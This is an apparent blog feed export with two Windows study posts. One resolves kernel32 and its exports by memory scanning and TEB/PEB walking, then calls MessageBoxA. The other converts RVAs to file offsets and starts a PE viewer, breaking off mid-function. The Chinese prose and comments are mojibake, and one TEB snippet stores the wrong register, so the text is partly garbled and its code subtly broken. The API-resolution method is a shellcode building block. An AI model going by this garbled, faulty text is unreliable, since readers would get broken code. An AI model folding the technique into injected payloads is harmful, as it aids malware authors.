    <content><![CDATA[<h4 id="åŠ¨æ€è·å–APIå…¥å£åœ°å€æ–¹æ³•"><a href="#åŠ¨æ€è·å–APIå…¥å£åœ°å€æ–¹æ³•" class="headerlink" title="åŠ¨æ€è·å–APIå…¥å£åœ°å€æ–¹æ³•"></a>åŠ¨æ€è·å–APIå…¥å£åœ°å€æ–¹æ³•</h4><p>é€šå¸¸æƒ³è¦åŠ¨æ€è·å–Apiå‡½æ•°çš„åœ°å€ï¼Œéœ€è¦è°ƒç”¨LoadlibraryA() å’ŒGetProcAddress()å‡½æ•°åŠ¨æ€è·å–ã€‚LoadlibraryA()ç”¨æ¥åŠ è½½APIå¯¹åº”çš„dllï¼ŒGetProcAddress()ç”¨æ¥è·å–APIå‡½æ•°å¯¹åº”çš„å…¥å£åœ°å€ã€‚</p>
<p>LoadLibraryA()å’ŒGetProcAddress()éƒ½æ˜¯åœ¨kernel32.dllä¸‹å¼•å‡ºçš„å‡½æ•°ï¼Œåœ¨kernel32å¼•å‡ºè¡¨ä¸­ï¼Œæ‰€ä»¥éœ€è¦å…ˆæ‰¾åˆ°kernel32åœ°å€æ‰èƒ½å†å»æ‰¾kernel32çš„å¼•å‡ºè¡¨åœ°å€ã€‚</p>
<p>ä¸€èˆ¬æœ‰ä¸‰ç§æ–¹æ³•å»æ‰¾kernel32çš„åŸºåœ°å€</p>
<ul>
<li>æš´åŠ›æœç´¢å†…å­˜</li>
<li>sehå¼‚å¸¸å¤„ç†é“¾è¡¨æœç´¢</li>
<li>TEB(Thread Environment Block)æœç´¢</li>
</ul>
<h5 id="æš´åŠ›æœç´¢æ³•"><a href="#æš´åŠ›æœç´¢æ³•" class="headerlink" title="æš´åŠ›æœç´¢æ³•"></a>æš´åŠ›æœç´¢æ³•</h5><p><a href="https://www.cnblogs.com/witty/archive/2012/03/27/2419725.html">https://www.cnblogs.com/witty/archive/2012/03/27/2419725.html</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">.386</span>		</span><br><span class="line">.model flat,stdcall		</span><br><span class="line">option casemap:none		</span><br><span class="line">	</span><br><span class="line">include		windows.inc</span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">	lpKernel32 dd <span class="number">0</span></span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">	GetKernelBase proc uses esi edi dwKernel:dword</span><br><span class="line"></span><br><span class="line">		local kernelbase:dword</span><br><span class="line">		mov edi, dwKernel</span><br><span class="line">		and edi, <span class="number">0f</span>fff0000h   ; åˆå§‹åŒ–é¡µ</span><br><span class="line">		.<span class="keyword">while</span> TRUE</span><br><span class="line">			.<span class="keyword">if</span> word ptr [edi] == IMAGE_DOS_SIGNATURE  ;ç­‰äºMZ?</span><br><span class="line">			mov esi, edi </span><br><span class="line">			add esi, [esi+IMAGE_DOS_HEADER.e_lfanew]	; esi+<span class="number">3</span>ch</span><br><span class="line">				.<span class="keyword">if</span> word ptr [esi] == IMAGE_NT_SIGNATURE   ;ç­‰äºPE?</span><br><span class="line">					mov kernelbase, edi</span><br><span class="line">					.<span class="keyword">break</span></span><br><span class="line">				.endif</span><br><span class="line">			.endif</span><br><span class="line">			sub edi, <span class="number">010000</span>h    ;æš´åŠ›æœç´¢å†…å­˜ <span class="number">64</span>kb å³æ¯æ¬¡å‡å°‘<span class="number">64</span>kb</span><br><span class="line">		.<span class="keyword">break</span>	.<span class="keyword">if</span> edi &lt; <span class="number">070000000</span>h ;åŸºåœ°å€å°äº<span class="number">70000000</span>hé€€å‡º</span><br><span class="line">		.endw</span><br><span class="line">		</span><br><span class="line">		mov eax, kernelbase ; å­˜åˆ°å¯„å­˜å™¨ä¸­å†è¿”å›</span><br><span class="line">		ret</span><br><span class="line">	GetKernelBase endp</span><br><span class="line"></span><br><span class="line">main proc</span><br><span class="line"></span><br><span class="line">	invoke GetKernelBase, [esp]</span><br><span class="line">	mov lpKernel32, eax</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">;æ‰¾åˆ°å¯¼å‡ºè¡¨ æ‰¾åˆ°å¯¼å‡ºè¡¨ä¸­ NumberOfNameså­—æ®µï¼ˆå­˜æ”¾ç€å¯¼å‡ºå‡½æ•°çš„æ€»ä¸ªæ•°ï¼‰ç”¨è¿™ä¸ªä¸ªæ•°æ„å»ºä¸€ä¸ªå¾ªç¯</span><br><span class="line">;åœ¨ AddressOfNames   æ‰§è¡Œå‡½æ•°åç§°åœ°å€è¡¨ </span><br><span class="line">;å¾ªç¯ä¸­å°†æ¯ä¸€é¡¹å®šä¹‰çš„å‡½æ•°åä¸æ‰€è¦æœç´¢çš„å‡½æ•°åè¿›è¡Œæ¯”è¾ƒ</span><br><span class="line">;å¦‚æœæ²¡æ‰¾åˆ°ä»»ä½•ä¸€ä¸ªå‡½æ•°åç¬¦åˆ è¡¨ç¤ºæ–‡ä»¶ä¸­æ²¡æœ‰è¯¥æŒ‡å®šåç§°çš„å‡½æ•°</span><br><span class="line">;å¦‚æœæ‰¾åˆ°ç›¸ç¬¦åˆçš„å‡½æ•°å é‚£ä¹ˆå°±å‡ ä¸‹è¿™ä¸ªå‡½æ•°ååœ¨å­—ç¬¦ä¸²åœ°å€è¡¨ä¸­çš„ç´¢å¼•å€¼ï¼Œç„¶ååœ¨AddressOfNameOrdinalsæŒ‡å‘çš„æ•°ç»„ä¸­ä½¿ç”¨åŒæ ·çš„ç´¢å¼•å€¼</span><br><span class="line">;ä½¿ç”¨è¯¥ç´¢å¼•å€¼ åœ¨AddressOfFunctionså­—æ®µæŒ‡å‘çš„å‡½æ•°å…¥å£åœ°å€è¡¨ä¸­è·å–çš„RVAå³å‡½æ•°å…¥å£åœ°å€RVA</span><br><span class="line"></span><br><span class="line"><span class="number">.386</span>		</span><br><span class="line">.model flat,stdcall		</span><br><span class="line">option casemap:none		</span><br><span class="line">	</span><br><span class="line">include		windows.inc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">	lpKernel32 dd <span class="number">0</span></span><br><span class="line">	szUser32 db <span class="string">&#x27;user32.dll&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpUser32 dd <span class="number">0</span></span><br><span class="line">	szMessageBoxA db <span class="string">&#x27;MessageBoxA&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpMessageBoxA dd <span class="number">0</span></span><br><span class="line">	szLoadLibraryA db <span class="string">&#x27;LoadLibraryA&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpLoadLibraryA dd <span class="number">0</span></span><br><span class="line">	szExitProcess db <span class="string">&#x27;ExitProcess&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpExitProcess dd <span class="number">0</span></span><br><span class="line">	szGetProcAddress db <span class="string">&#x27;GetProcAddress&#x27;</span>,<span class="number">0</span></span><br><span class="line">	lpGetProcAddress dd <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	hola db <span class="string">&#x27;hola!&#x27;</span></span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line"></span><br><span class="line">	GetKernelBase proc uses esi edi dwKernel:dword</span><br><span class="line"></span><br><span class="line">		local kernelbase:dword</span><br><span class="line">		mov edi, dwKernel</span><br><span class="line">		and edi, <span class="number">0f</span>fff0000h   ; åˆå§‹åŒ–é¡µ</span><br><span class="line">		.<span class="keyword">while</span> TRUE</span><br><span class="line">			.<span class="keyword">if</span> word ptr [edi] == IMAGE_DOS_SIGNATURE  ;ç­‰äºMZ?</span><br><span class="line">			mov esi, edi </span><br><span class="line">			add esi, [esi+IMAGE_DOS_HEADER.e_lfanew]	; [esi+<span class="number">3</span>ch]</span><br><span class="line">				.<span class="keyword">if</span> word ptr [esi] == IMAGE_NT_SIGNATURE   ;ç­‰äºPE?</span><br><span class="line">					mov kernelbase, edi</span><br><span class="line">					.<span class="keyword">break</span></span><br><span class="line">				.endif</span><br><span class="line">			.endif</span><br><span class="line">			sub edi, <span class="number">010000</span>h    ;æš´åŠ›æœç´¢å†…å­˜ <span class="number">64</span>kb å³æ¯æ¬¡å‡å°‘<span class="number">64</span>kb   </span><br><span class="line">				;kernel32.dllçš„å—å¯¹é½å€¼æ˜¯<span class="number">00001000</span>h, å¹¶ä¸”ä¸€èˆ¬DLLä»¥<span class="number">1</span>Mä¸ºè¾¹ç•Œï¼Œé€šè¿‡<span class="number">10000</span>h (<span class="number">64</span>k) ä½œä¸ºè·¨åº¦</span><br><span class="line">		.<span class="keyword">break</span>	.<span class="keyword">if</span> edi &lt; <span class="number">070000000</span>h ;åŸºåœ°å€å°äº<span class="number">70000000</span>hé€€å‡º</span><br><span class="line">		.endw</span><br><span class="line">		</span><br><span class="line">		mov eax, kernelbase ; å­˜åˆ°å¯„å­˜å™¨ä¸­å†è¿”å›</span><br><span class="line">		ret</span><br><span class="line">	GetKernelBase endp</span><br><span class="line"></span><br><span class="line">;hMoudle åŸºåœ°å€</span><br><span class="line">	GetApi proc hModule:dword, szApiname:dword</span><br><span class="line">		local apilen:dword	;localå£°æ˜å±€éƒ¨éå†</span><br><span class="line">		local apibase:dword</span><br><span class="line"></span><br><span class="line">		pushad</span><br><span class="line">		;è®¡ç®—apiå­—ç¬¦é•¿åº¦</span><br><span class="line">		mov esi, szApiname</span><br><span class="line">		mov edx, esi</span><br><span class="line">countStr:</span><br><span class="line">		cmp byte ptr [esi], <span class="number">0</span> ;å­—ç¬¦ä¸²æœ«å°¾æ˜¯å¦ä¸º<span class="number">0</span></span><br><span class="line">		jz countStrOver</span><br><span class="line">		inc esi;è¿˜æ²¡ç»“æŸç»§ç»­</span><br><span class="line">		jmp countStr</span><br><span class="line"></span><br><span class="line">countStrOver:</span><br><span class="line">		inc esi</span><br><span class="line">		sub esi, edx ;å‡å»é¦–åœ°å€å¾—åˆ°é•¿åº¦</span><br><span class="line">		mov apilen, esi</span><br><span class="line"></span><br><span class="line">		;æ‰¾åˆ°å¯¼å‡ºè¡¨åœ°å€</span><br><span class="line">		mov esi, hModule;æ‹¿åˆ°æ¨¡å—åŸºåœ°å€		ä¸€èˆ¬esiå­˜æ”¾æŒ‡é’ˆã€åœ°å€</span><br><span class="line">		add esi, [esi+<span class="number">3</span>ch];	+<span class="number">3</span>chå®šä½åˆ°NT_HEADERS</span><br><span class="line">		assume esi:ptr IMAGE_NT_HEADERS ;</span><br><span class="line">		</span><br><span class="line">		mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress;å¾—åˆ°å¯¼å‡ºè¡¨RVA</span><br><span class="line">		add esi, hModule;åŠ ä¸ŠåŸºåœ°å€ å®šä½åˆ°åœ°å€</span><br><span class="line"></span><br><span class="line">		assume esi:ptr IMAGE_EXPORT_DIRECTORY; è®©esi æŒ‡å‘ Kernel32.dll çš„å¯¼å‡ºè¡¨</span><br><span class="line"></span><br><span class="line">		mov ebx, [esi].AddressOfNames; </span><br><span class="line">		add ebx, hModule</span><br><span class="line"></span><br><span class="line">		xor edx, edx ;è®¡æ•°å‡½æ•° å…ˆåˆå§‹åŒ–</span><br><span class="line">		.repeat</span><br><span class="line">			push esi</span><br><span class="line">			mov edi, [ebx]</span><br><span class="line">			add edi, hModule; æŒ‡å‘AddressOfNamesæŒ‡å‘çš„æ•°ç»„</span><br><span class="line">			mov esi, szApiname</span><br><span class="line">			mov ecx, apilen</span><br><span class="line">			cld  ;è®¾ç½®æ–¹å‘æ ‡å¿— æ­£å‘</span><br><span class="line">			repz cmpsb ;å¼€å§‹éå†æŸ¥æ‰¾      rep(é‡å¤)z(ç›¸ç­‰) ds:esiå’Œes:edi æ‰€æŒ‡å‘çš„ä¸¤ä¸ªå­—èŠ‚ç›¸ç­‰(zf=<span class="number">1</span>) å°±ç»§ç»­æ¯”è¾ƒ  å¦‚æœä¸ç›¸ç­‰å°±åœæ­¢å¾ªç¯</span><br><span class="line"></span><br><span class="line">			.<span class="keyword">if</span> ZERO? ; æ‰¾åˆ°äº†    ZERO?æ˜¯å¦ç½®ä½ ç›¸å½“äº <span class="keyword">if</span>(zf==<span class="number">1</span>)</span><br><span class="line">				pop esi ; æ¢å¤esi  esiæŒ‡å‘å¯¼å‡ºè¡¨</span><br><span class="line">				jmp findOver</span><br><span class="line">			.endif</span><br><span class="line">			;å¦‚æœæ²¡æ‰¾åˆ°</span><br><span class="line">			pop esi ; æ¢å¤esi  esiæŒ‡å‘å¯¼å‡ºè¡¨</span><br><span class="line">			add ebx,<span class="number">4</span> ;ä¸‹ä¸€ä¸ªå‡½æ•°åç§° æ¯ä¸ªå‡½æ•°åœ°å€å <span class="number">4</span>ä¸ªå­—èŠ‚</span><br><span class="line">			inc edx; è®¡æ•°å‡½æ•°åŠ <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		.until edx &gt;= [esi].NumberOfNames ;éå†å®Œåæ²¡æœ‰æ‰¾åˆ° é€€å‡º   NumberOfNameså‡½æ•°åç§°æ€»æ•°é‡</span><br><span class="line">		jmp _Exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">findOver:</span><br><span class="line">		sub ebx, hModule; å‡å»åŸºåœ°å€ å¾—åˆ°RVA</span><br><span class="line">		sub ebx, [esi].AddressOfNames;å¾—åˆ°åŒ¹é…å‡½æ•°å­—ç¬¦ä¸²é¦–åœ°å€ ç›¸å½“äºæ•°ç»„èµ·å§‹åœ°å€çš„åç§»é‡</span><br><span class="line"></span><br><span class="line">		;é™¤ä»¥<span class="number">2</span>ï¼Œç”¨è¿™ä¸ªåç§»é‡+AddressOfNameOrdinalsæŒ‡å‘çš„æ•°ç»„é¦–åœ°å€æ‰¾åˆ°ç´¢å¼•</span><br><span class="line">		shr ebx,<span class="number">1</span> </span><br><span class="line">		add ebx,[esi].AddressOfNameOrdinals;åŠ ä¸Šç®—å‡ºæ¥çš„åç§»é‡æ‰¾åˆ°å’ŒAddressOfNameså¯¹åº”çš„é‚£ä¸€é¡¹</span><br><span class="line">		add ebx,hModule</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		movzx eax,word ptr [ebx];å–å‡ºAddressOfNameOrdinalsé‚£ä¸€é¡¹å­˜æ”¾çš„ç´¢å¼•  word movzxé«˜ä½æ‹“å±•<span class="number">0</span></span><br><span class="line">		shl eax,<span class="number">2</span>;ä¹˜ä»¥<span class="number">4</span>   ç´¢å¼•å€¼x4ä¸ªå­—èŠ‚+</span><br><span class="line">		add eax,[esi].AddressOfFunctions;AddressOfFunctionsæŒ‡å‘å‡½æ•°RVAåœ°å€è¡¨èµ·å§‹åœ°å€ï¼ŒåŠ ä¸Šè¿™ä¸ªåç§»é‡å–å‡ºAddressOfNameOrdinalsç»™å‡ºç´¢å¼•çš„é‚£ä¸€é¡¹</span><br><span class="line">		add eax,hModule</span><br><span class="line"></span><br><span class="line">		;API<span class="number">&#x27;</span>s Address = ( API<span class="number">&#x27;</span>s Ordinal * <span class="number">4</span> ) + AddressOfFunctions<span class="number">&#x27;</span> VA + Kernel32 imagebase</span><br><span class="line"></span><br><span class="line">		mov eax,[eax];å¾—åˆ°å‡½æ•°çš„RVA</span><br><span class="line">		add eax,hModule;åŠ ä¸Škernel32åŸºåœ°å€å¾—åˆ°å‡½æ•°å…¥å£åœ°å€VA</span><br><span class="line">		mov apibase,eax</span><br><span class="line"></span><br><span class="line">_Exit:</span><br><span class="line">		assume esi:nothing ;ä¸å†ä½¿ç”¨esiå¯„å­˜å™¨ä½œä¸ºæŒ‡é’ˆæ—¶  ç”¨assume esi:nothingå–æ¶ˆå®šä¹‰ é‡Šæ”¾æ‰ã€‚</span><br><span class="line">		popad</span><br><span class="line">		mov eax, apibase</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">	GetApi endp</span><br><span class="line"></span><br><span class="line">main proc</span><br><span class="line"></span><br><span class="line">	;å¾—åˆ°kernel32åŸºåœ°å€</span><br><span class="line">	invoke GetKernelBase, [esp]</span><br><span class="line">	mov lpKernel32, eax</span><br><span class="line">	</span><br><span class="line">	;è·å–API</span><br><span class="line">	invoke GetApi, lpKernel32, addr szLoadLibraryA</span><br><span class="line">	mov lpLoadLibraryA, eax</span><br><span class="line">	</span><br><span class="line">	invoke GetApi, lpKernel32, addr szGetProcAddress</span><br><span class="line">	mov lpGetProcAddress, eax</span><br><span class="line"></span><br><span class="line">	invoke GetApi,lpKernel32,addr szExitProcess</span><br><span class="line">	mov lpExitProcess,eax</span><br><span class="line"></span><br><span class="line">	;è½½å…¥user32.dll</span><br><span class="line">	push offset szUser32</span><br><span class="line">	call [lpLoadLibraryA]</span><br><span class="line">	mov lpUser32,eax</span><br><span class="line"></span><br><span class="line">	;è·å–user32.dllä¸­çš„MessageBoxA</span><br><span class="line">	push offset szMessageBoxA</span><br><span class="line">	push lpUser32</span><br><span class="line">	call [lpGetProcAddress]</span><br><span class="line">	mov lpMessageBoxA,eax</span><br><span class="line">	</span><br><span class="line">	push MB_OK </span><br><span class="line">	push  offset hola</span><br><span class="line">	push  offset hola</span><br><span class="line">	push <span class="literal">NULL</span></span><br><span class="line">	call [lpMessageBoxA]</span><br><span class="line"></span><br><span class="line">	push <span class="number">0</span></span><br><span class="line">	call [lpExitProcess]</span><br><span class="line"></span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>åœ¨VS2022ä¸‹ç¼–è¯‘æœ‰é—®é¢˜ ç„¶ååˆæ¢åˆ°äº†vs2017 æˆåŠŸé€šè¿‡æ‰¾apiåœ°å€çš„æ–¹å¼å»è°ƒç”¨MessageBoxAå‡½æ•°</p>
<p><img src="/posts/9aa42a48/13-1.png"></p>
<h5 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h5><p>å¾…å®Œå–„è¡¥å……â€¦</p>
<h5 id="TEBæœç´¢"><a href="#TEBæœç´¢" class="headerlink" title="TEBæœç´¢"></a>TEBæœç´¢</h5><p>æ­¤æ–¹æ³•æ˜¯é€šè¿‡TEBè·å¾—PEBç»“æ„åœ°å€ï¼Œç„¶åå†è·å¾—PEB_LDR_DATAç»“æ„åœ°å€ï¼Œç„¶åéå†æ¨¡å—åˆ—è¡¨ï¼ŒæŸ¥æ‰¾kernel32.dllæ¨¡å—çš„åŸºåœ°å€ã€‚</p>
<p>fså¯„å­˜å™¨æŒ‡å‘TEBç»“æ„ï¼Œ<code>TEB+0X30</code>åç§»å¤„æŒ‡å‘PEBç»“æ„ï¼Œ<code>PEB+0x0c</code>åç§»å¤„æŒ‡å‘<code>PEB_LDR_DATA</code>ç»“æ„ï¼Œ<code>PEB_LDR_DATA+0x1c</code>åç§»å¤„å­˜æ”¾ç€ç¨‹åºåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“åœ°å€ã€‚ æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªåœ°å€ä¸º<code>ntdll.dll</code> ç¬¬äºŒä¸ªä¸º<code>kernel32.dll</code></p>
<p>ä½¿ç”¨dt _teb æŸ¥çœ‹tebç»“æ„ å¯ä»¥çœ‹åˆ°åœ¨0x30åç§»å¤„å­˜å‚¨ç€PEBç»“æ„çš„åœ°å€ï¼Œç„¶ååœ¨æŸ¥çœ‹pebç»“æ„</p>
<p><img src="/posts/9aa42a48/13-2.png"></p>
<p>pebç»“æ„åœ¨0x0cåœ°å€å¤„å­˜å‚¨ç€ _PEB_LDR_DATAç»“æ„åœ°å€ï¼Œç„¶åæŸ¥çœ‹_PEB_LDR_DATAç»“æ„</p>
<p><img src="/posts/9aa42a48/13-3.png" alt="img"></p>
<p>é€šè¿‡ _PEB_LDR_DATA æ‹¿åˆ°ä¿å­˜æ¨¡å—ä¿¡æ¯ç»“æ„ä½“çš„é“¾è¡¨ _LIST_ENTRT </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lkd&gt; dt _PEB_LDR_DATA</span><br><span class="line">nt!_PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Initialized      : UChar</span><br><span class="line">   +<span class="number">0x008</span> SsHandle         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x024</span> EntryInProgress  : Ptr32 Void</span><br><span class="line">   ....</span><br></pre></td></tr></table></figure>

<p><code>_LIST_ENTRY</code>æœ‰ä¸‰ç§ä¸åŒæ–¹å¼æ’åˆ—çš„åŒå‘é“¾è¡¨</p>
<p><img src="/posts/9aa42a48/13-4.png" alt="img"></p>
<p><code>Flink</code>è¡¨ç¤ºä»å‰å¾€åï¼Œ <code>Blink</code>è¡¨ç¤ºä»åå¾€å‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	DWORD kernel32str = <span class="number">0</span>;</span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax, fs: [<span class="number">30</span>h]				<span class="comment">//æ‹¿åˆ°peb</span></span><br><span class="line">		mov eax, dword ptr [eax + <span class="number">0</span>ch]	<span class="comment">//æ‹¿åˆ°_PEB_LDR_DATA</span></span><br><span class="line">		mov eax, dword ptr [eax + <span class="number">0</span>ch]	<span class="comment">//è·å–InLoadOrderModuleListåœ°å€</span></span><br><span class="line"></span><br><span class="line">		mov eax, [eax]</span><br><span class="line">		mov eax, [eax]</span><br><span class="line"></span><br><span class="line">		mov ebx, dword ptr [eax + <span class="number">18</span>h]</span><br><span class="line">		mov kernel32str, ebx</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%0x&quot;</span>, kernel32str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD kernel32str = <span class="number">0</span>;</span><br><span class="line">	_asm &#123;</span><br><span class="line"></span><br><span class="line">		mov eax, fs:[<span class="number">30</span>h]				<span class="comment">//peb</span></span><br><span class="line">		mov eax, dword ptr [eax + <span class="number">0</span>ch]	<span class="comment">//</span></span><br><span class="line">		mov esi, dword ptr [eax + <span class="number">1</span>ch]	<span class="comment">//InInitializationOrderLinks</span></span><br><span class="line">        <span class="comment">//Get InInitializationOrderModuleList.Flink, </span></span><br><span class="line">        <span class="comment">//æ­¤æ—¶eaxæŒ‡å‘çš„æ˜¯ntdllæ¨¡å—çš„InInitializationOrderModuleListçº¿æ€§åœ°å€ã€‚</span></span><br><span class="line">        <span class="comment">//æ‰€ä»¥æˆ‘ä»¬è·å¾—å®ƒçš„ä¸‹ä¸€ä¸ªåˆ™æ˜¯kernel32.dll</span></span><br><span class="line">            </span><br><span class="line">		lodsd <span class="comment">//å¯ä»¥ä¼˜åŒ–</span></span><br><span class="line">		mov eax, dword ptr [eax + <span class="number">8</span>h]	<span class="comment">//</span></span><br><span class="line">		mov kernel32str, ebx</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, kernel32str);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/9aa42a48/13-5.png" alt="img"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.cnblogs.com/witty/archive/2012/03/23/2413890.html">https://www.cnblogs.com/witty/archive/2012/03/23/2413890.html</a></p>
<p><a href="https://blog.csdn.net/qq_35426012/article/details/102711275">https://blog.csdn.net/qq_35426012/article/details/102711275</a></p>
<p><a href="https://blog.csdn.net/whypp/article/details/5681172">https://blog.csdn.net/whypp/article/details/5681172</a></p>
<p><a href="https://blog.csdn.net/b_h_l/article/details/30506955">https://blog.csdn.net/b_h_l/article/details/30506955</a></p>
<p>[<a href="https://juejin.cn/post/7102343426070298660#heading-3">ç¬”è®°]Windowså®‰å…¨ä¹‹ã€Šä¸‰ã€‹æ³¨å…¥æŠ€æœ¯ä¹‹ Shellcodeæ³¨å…¥ - æ˜é‡‘</a></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-12_PEç»“æ„</title>
    <url>/posts/896a905d/</url>
    <content><![CDATA[<p>å‰é¢åœ¨githubä¸Šå†™è¿‡è¿™ä¸ªpeåŸºç¡€ åœ¨çœ‹ä¸‹è¿™ä¸ªå¤ä¹ ä¸‹ <a href="https://mamor5409.github.io/posts/d8527941/">https://mamor5409.github.io/posts/d8527941/</a></p>
<p>çœ‹äº†ä¸‹æ»´æ°´ä¸‰æœŸçš„PE å¹¶å‚è€ƒä¸€ä½å¸ˆå‚…çš„æ»´æ°´ç¬”è®° <a href="https://github.com/gh0stkey/Binary-Learning">https://github.com/gh0stkey/Binary-Learning</a></p>
<h4 id="RVA-2-FOA"><a href="#RVA-2-FOA" class="headerlink" title="RVA_2_FOA"></a>RVA_2_FOA</h4><p><img src="/posts/896a905d/12-1.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">RVAToFOA</span><span class="params">(HANDLE imageBase, DWORD dwRVA)</span></span><br><span class="line">&#123;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHead = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSection = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD NumberOfSectinsCount = <span class="number">0</span>;</span><br><span class="line">	DWORD dwImageBase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	pNtHead = GetNtHeader(imageBase);</span><br><span class="line">	pSection = IMAGE_FIRST_SECTION(pNtHead);</span><br><span class="line"></span><br><span class="line">	dwImageBase = pNtHead-&gt;OptionalHeader.ImageBase;</span><br><span class="line">	NumberOfSectinsCount = pNtHead-&gt;FileHeader.NumberOfSections;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> each = <span class="number">0</span>; each &lt; NumberOfSectinsCount; each++)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD Section_Start = pSection[each].VirtualAddress;                                  <span class="comment">// è®¡ç®—RVAå¼€å§‹ä½ç½®</span></span><br><span class="line">		DWORD Section_Ends = pSection[each].VirtualAddress + pSection[each].Misc.VirtualSize; <span class="comment">// è®¡ç®—RVAç»“æŸä½ç½®</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dwRVA &gt;= Section_Start &amp;&amp; dwRVA &lt;= Section_Ends)</span><br><span class="line">		&#123;</span><br><span class="line">			DWORD VA = pNtHead-&gt;OptionalHeader.ImageBase + dwRVA;                                  <span class="comment">// å¾—åˆ°VAåœ°å€</span></span><br><span class="line">			DWORD FOA = pSection[each].PointerToRawData + (dwRVA - pSection[each].VirtualAddress); <span class="comment">// å¾—åˆ°FOA</span></span><br><span class="line">			<span class="keyword">return</span> FOA;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="ç®€å•å®ç°PEview"><a href="#ç®€å•å®ç°PEview" class="headerlink" title="ç®€å•å®ç°PEview"></a>ç®€å•å®ç°PEview</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;DbgHelp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HANDLE <span class="title function_">OpenPe</span><span class="params">(<span class="type">char</span>* filename)</span> &#123;</span><br><span class="line"></span><br><span class="line">	HANDLE hfile = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hMapfile = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE èµ·å§‹åŸºåœ°å€ = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD size = <span class="number">0</span>;</span><br><span class="line">	hfile = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	size = GetFileSize(hfile, <span class="literal">NULL</span>);</span><br><span class="line">	hMapfile = CreateFileMapping(hfile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, size, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	èµ·å§‹åŸºåœ°å€ = MapViewOfFile(hMapfile, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, size);</span><br><span class="line">	<span class="keyword">if</span>(èµ·å§‹åŸºåœ°å€ != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> èµ·å§‹åŸºåœ°å€;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æœªèƒ½æˆåŠŸæ‰“å¼€ï¼\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showDosHeadInfo</span><span class="params">(HANDLE imageBase)</span> 